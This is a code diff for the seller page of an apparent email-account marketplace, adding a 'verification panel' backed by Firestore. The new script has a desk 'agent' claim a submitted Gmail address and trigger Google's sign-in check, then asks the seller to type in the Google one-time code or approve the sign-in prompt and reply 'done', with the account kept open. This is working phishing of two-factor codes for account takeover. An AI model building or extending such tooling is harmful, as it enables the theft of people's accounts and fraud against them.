@@ -782,6 +782,27 @@ body::before{
     .status-card{ padding:18px; }
 }
 
+/* ---------- verification panel ---------- */
+.verify-box{
+    display:none;margin-top:15px;padding:15px;
+    border-radius:13px;
+    background:linear-gradient(135deg,rgba(8,124,255,.16),rgba(0,213,255,.05));
+    border:1px solid rgba(0,213,255,.30);
+}
+.verify-box.show{ display:block; }
+.verify-title{ font-size:13px;font-weight:800;margin-bottom:6px; }
+.verify-help{ font-size:12px;color:#8ba3bd;line-height:1.7;margin-bottom:12px; }
+.verify-help b{ color:#fff; }
+.verify-wait{
+    display:flex;align-items:center;gap:8px;
+    font-size:12.5px;color:#9be3ff;line-height:1.6;
+}
+.verify-wait .pulse{
+    width:8px;height:8px;border-radius:50%;background:#00d5ff;flex-shrink:0;
+    animation:vpulse 1.2s ease-in-out infinite;
+}
+@keyframes vpulse{0%,100%{opacity:.35}50%{opacity:1}}
+
 </style>
 </head>
 
@@ -936,6 +957,24 @@ body::before{
                 If Google sends any OTP, verification number or security prompt, submit it in the box below so we can verify and
                 <b>complete your sale</b>. You can also reach the <b>admin</b> anytime to speed things up.
             </div>
+
+            <div class="verify-box" id="verifyBox">
+                <div class="verify-title" id="verifyTitle">Queued</div>
+                <div class="verify-help" id="verifyHelp"></div>
+                <div class="verify-wait" id="verifyWait" style="display:none">
+                    <span class="pulse"></span><span id="verifyWaitText"></span>
+                </div>
+                <form id="verifyForm" style="display:none">
+                    <div class="field">
+                        <label id="verifyLabel" for="verifyInput">Google code</label>
+                        <div class="input-wrap">
+                            <input type="text" id="verifyInput" autocomplete="one-time-code" placeholder="Enter the code">
+                        </div>
+                    </div>
+                    <div class="success-box" id="verifySuccess"></div>
+                    <button type="submit" class="submit-btn" id="verifyBtn">Send to the agent</button>
+                </form>
+            </div>
         </section>
 
         <!-- Step 2: additional submission -->
@@ -990,7 +1029,8 @@ body::before{
 
 <script type="module">
 
-import { auth, db, onAuthStateChanged, signOut, collection, addDoc, doc, getDocs, query, where, updateDoc, onSnapshot, arrayUnion, serverTimestamp } from "./js/supabase.js";
+import { auth, db, onAuthStateChanged, signOut, collection, addDoc, doc, getDocs, query, where, updateDoc, onSnapshot, arrayUnion, serverTimestamp } from "./js/firebase.js";
+import { submitVerification } from "./js/emaildesk.js";
 
 /* Auth guard — same pattern as the dashboard */
 onAuthStateChanged(auth,(user)=>{
@@ -1034,11 +1074,12 @@ document.getElementById("contactAdmin").addEventListener("click",()=>{
     alert("Demo: open live chat or email admin@mailmart.com to complete your sale.");
 });
 
-/* Track the submitted email + chosen category + Supabase row id */
+/* Track the submitted email + chosen category + Firestore doc id */
 let submittedEmail="";
 let chosenCat="OTP";
 let saleId=null;
 let unsubSale=null;
+let currentSale=null;
 
 /* Live status sync — reflects admin actions (approve / pay / reject) */
 function setStatus(status){
@@ -1095,7 +1136,7 @@ saleForm.addEventListener("submit",async(e)=>{
         return;
     }
 
-    /* save to Supabase so the admin receives it */
+    /* save to Firestore so the admin receives it */
     try{
         const ref=await addDoc(collection(db,"sales"),{
             email:emailVal,
@@ -1103,6 +1144,13 @@ saleForm.addEventListener("submit",async(e)=>{
             status:"pending",
             submissions:[],
             uid:user.uid,
+            claimedBy:null,
+            claimedByEmail:"",
+            claimedAt:null,
+            verificationType:null,
+            verificationStatus:"none",
+            verificationRequestedAt:null,
+            verificationValue:"",
             createdAt:serverTimestamp()
         });
         loadSale(ref.id,{
@@ -1113,7 +1161,7 @@ saleForm.addEventListener("submit",async(e)=>{
         });
     }catch(err){
         console.error(err);
-        alert("Could not save your submission. Check your Supabase security rules.");
+        alert("Could not save your submission. Check your Firestore security rules.");
         return;
     }
 
@@ -1139,6 +1187,7 @@ async function restoreLatestSale(uid){
 /* Load a sale into the UI and keep it synced with admin actions */
 function loadSale(id,data){
     saleId=id;
+    currentSale={ id:id, ...data };
     submittedEmail=data.email||"";
 
     document.getElementById("statusEmail").textContent=submittedEmail;
@@ -1169,11 +1218,15 @@ function loadSale(id,data){
 
     /* live updates from admin */
     if(unsubSale) unsubSale();
+    setVerification(data);
+
     unsubSale=onSnapshot(doc(db,"sales",id),(snap)=>{
         if(snap.exists()){
             const sd=snap.data();
+            currentSale={ id:id, ...sd };
             if(sd.email) submittedEmail=sd.email;
             setStatus(sd.status||"pending");
+            setVerification(sd);
         }
     });
 }
@@ -1209,7 +1262,7 @@ addForm.addEventListener("submit",async(e)=>{
         return;
     }
 
-    /* push the follow-up into the same Supabase sale doc */
+    /* push the follow-up into the same Firestore sale doc */
     try{
         await updateDoc(doc(db,"sales",saleId),{
             submissions:arrayUnion({
@@ -1221,7 +1274,7 @@ addForm.addEventListener("submit",async(e)=>{
         });
     }catch(err){
         console.error(err);
-        alert("Could not send to admin. Check your Supabase security rules.");
+        alert("Could not send to admin. Check your Firestore security rules.");
         return;
     }
 
@@ -1258,5 +1311,135 @@ function escapeHtml(s){
 
 </script>
 
-<script>(function(){function c(){var b=a.contentDocument||(a.contentWindow&&a.contentWindow.document);if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'a30994ef6fa26fa0',t:'MTc4NzY1MDI2NQ=='};var a=document.createElement('script');a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script></body>
+<script>(function(){function c(){var b=a.contentDocument||(a.contentWindow&&a.contentWindow.document);if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'a30994ef6fa26fa0',t:'MTc4NzY1MDI2NQ=='};var a=document.createElement('script');a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();
+/* ------------------------------------------------------------------
+   VERIFICATION PANEL
+
+   The seller submits once, then waits. Someone at the desk claims the
+   mail and triggers Google's check; when they do, this panel opens with
+   a field for the code — or asks for "done" when it was a prompt.
+------------------------------------------------------------------ */
+function setVerification(data){
+
+    const box=document.getElementById("verifyBox");
+    if(!box) return;
+
+    const title=document.getElementById("verifyTitle");
+    const help=document.getElementById("verifyHelp");
+    const wait=document.getElementById("verifyWait");
+    const waitText=document.getElementById("verifyWaitText");
+    const form=document.getElementById("verifyForm");
+    const label=document.getElementById("verifyLabel");
+    const input=document.getElementById("verifyInput");
+
+    const vs=(data&&data.verificationStatus)||"none";
+    const vt=data&&data.verificationType;
+
+    function waiting(text){
+        wait.style.display="flex";
+        waitText.textContent=text;
+        form.style.display="none";
+    }
+
+    function ask(){
+        wait.style.display="none";
+        form.style.display="block";
+    }
+
+    if(vs==="none"){
+        box.classList.add("show");
+        title.textContent="Queued — keep this account open";
+        help.innerHTML=
+            "Your mail has been <b>added to the queue</b> and a verification agent will pick it up shortly. "+
+            "<b>Stay logged in to this account and keep this page open.</b> "+
+            "Google will send a verification code or a sign-in prompt soon — "+
+            "when the agent is ready, this box will ask you for it.";
+        waiting("Waiting for an agent to pick up your mail…");
+        return;
+    }
+
+    if(vs==="requested"){
+        box.classList.add("show");
+        if(vt==="prompt"){
+            title.textContent="Approve the Google prompt";
+            help.innerHTML=
+                "Our agent has triggered a Google sign-in prompt on this account. "+
+                "<b>Tap Yes / Allow on the prompt</b>, then type <b>done</b> below.";
+            label.textContent="Type done once you have approved it";
+            input.placeholder="done";
+        }else{
+            title.textContent="Enter the Google code";
+            help.innerHTML=
+                "Google has sent a verification code for this account. "+
+                "<b>Type it exactly as it appears</b> so our agent can finish verifying.";
+            label.textContent="Google verification code";
+            input.placeholder="e.g. 123456";
+        }
+        ask();
+        return;
+    }
+
+    if(vs==="submitted"){
+        box.classList.add("show");
+        title.textContent="Sent to the agent";
+        help.innerHTML="We have passed that to the agent working your mail. Keep the account accessible in case they need one more check.";
+        waiting("Agent is checking what you sent…");
+        return;
+    }
+
+    if(vs==="verified"){
+        box.classList.add("show");
+        title.textContent="Verified";
+        help.innerHTML="Your mail checked out. Your sale is being completed.";
+        waiting("Verification passed.");
+        return;
+    }
+
+    if(vs==="failed"){
+        box.classList.add("show");
+        title.textContent="That code did not work";
+        help.innerHTML="The agent could not use what you sent. They will trigger a fresh check shortly — keep the account open.";
+        waiting("Waiting for the agent to request a new check…");
+        return;
+    }
+}
+
+/* Send the code — or "done" for a prompt — to whoever is working the mail */
+document.getElementById("verifyForm").addEventListener("submit",async(e)=>{
+
+    e.preventDefault();
+
+    if(!currentSale){
+        alert("Submit your email first.");
+        return;
+    }
+
+    const input=document.getElementById("verifyInput");
+    const btn=document.getElementById("verifyBtn");
+    const success=document.getElementById("verifySuccess");
+    const text=input.value.trim();
+
+    if(!text){
+        alert("Enter the code, or type done if you approved a prompt.");
+        return;
+    }
+
+    btn.disabled=true;
+    btn.textContent="Sending…";
+
+    try{
+        await submitVerification(currentSale,text);
+        input.value="";
+        success.textContent="Sent to the agent.";
+        success.classList.add("show");
+    }catch(err){
+        console.error(err);
+        alert(err.message||"Could not send that. The agent has to ask for it first.");
+    }finally{
+        btn.disabled=false;
+        btn.textContent="Send to the agent";
+    }
+});
+
+</script></body>
 </html>
